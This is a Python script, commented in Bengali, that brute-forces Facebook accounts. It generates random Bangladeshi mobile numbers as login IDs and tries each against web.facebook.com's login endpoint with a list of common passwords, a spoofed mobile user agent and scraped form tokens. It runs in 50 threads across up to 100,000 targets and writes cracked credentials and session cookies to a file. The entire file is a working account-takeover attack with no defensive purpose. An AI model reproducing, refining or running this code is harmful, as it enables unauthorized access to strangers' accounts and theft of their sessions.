import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor

# রঙ সেটআপ
G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; W = '\033[1;37m'
loop = 0
ok = []

def banner():
    os.system('clear')
    print(f"""{G}
    ███    ███  ███████  ████████  █████  
    ████  ████  ██          ██    ██   ██ 
    ██ ████ ██  █████       ██    ███████ 
    ██  ██  ██  ██          ██    ██   ██ 
    ██      ██  ███████     ██    ██   ██ 
{W}×××××××××××××××××××××××××××××××××××××××××××××××××
 [✓] VERSION   : ULTRA POWERFUL VIVO-V2055
 [✓] ENGINE    : EDGE-MOBILE-AJAX
 [✓] LIMIT     : 1,00,000 ID TARGET
{W}×××××××××××××××××××××××××××××××××××××××××××××××××""")

def engine(uid, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[JILANI-FINAL] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    # আপনার দেওয়া ডাটা থেকে সেরা পাসওয়ার্ড লিস্ট
    pws = [uid, uid[6:], uid[:6], 'bangladesh', '@@##1122', '778899', 'i love you', 'khan123', 'mim123', 'Allah123', 'bismillah', 'freefire', 'gaming123']
    
    for pas in pws:
        if len(pas) < 6: continue
        session = requests.Session()
        
        # আপনার ভিভো ফোন এবং এডজ ব্রাউজারের সেই রিয়েল ইউজার এজেন্ট
        ua = "Mozilla/5.0 (Linux; Android 13; V2055 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36 EdgA/144.0.0.0"
        
        try:
            # সেশন টোকেন রিট্রিভাল
            free_fb = session.get('https://web.facebook.com/login/').text
            lsd = re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1)
            
            # আপনার লগের ডাটা থেকে নেওয়া হাই-লেভেল হেডার
            headers = {
                'Host': 'web.facebook.com',
                'content-length': '724',
                'x-asbd-id': '129477',
                'user-agent': ua,
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/login/',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
            }

            data = {
                "lsd": lsd, "jazoest": jazoest,
                "email": uid, "pass": pas,
                "login": "Log In"
            }

            # আপনার দেওয়া Ajax Endpoint দিয়ে অ্যাটাক
            post = session.post('https://web.facebook.com/ajax/httponly_cookies.php', data=data, headers=headers)

            if 'c_user' in session.cookies.get_dict():
                ok.append(uid)
                print(f'\n{G}[SUCCESS-OK💚] {uid} | {pas}')
                # কুকি সেভ করা হচ্ছে
                ck = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                open('/sdcard/JILANI_MASTER_OK.txt', 'a').write(f'{uid}|{pas}|{ck}\n')
                break
            elif 'checkpoint' in session.cookies.get_dict():
                # print(f'\n{R}[CP] {uid} | {pas}') # চাইলে সিপি দেখতে পারেন
                break
        except: pass
    loop += 1

def start():
    banner()
    code = input(f'{G}[+] ENTER CODE (017/018/019): {W}')
    limit = 100000 
    with ThreadPoolExecutor(max_workers=50) as submit:
        banner()
        print(f'{G}[+] TARGET CODE: {code} | LIMIT: {limit}')
        print(f'{Y}[!] TIP: USE MOBILE HOTSPOT FOR 100% RESULT')
        print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××\n')
        for _ in range(limit):
            uid = code + "".join(random.choices("0123456789", k=8))
            submit.submit(engine, uid, limit)

if __name__ == "__main__":
    start()
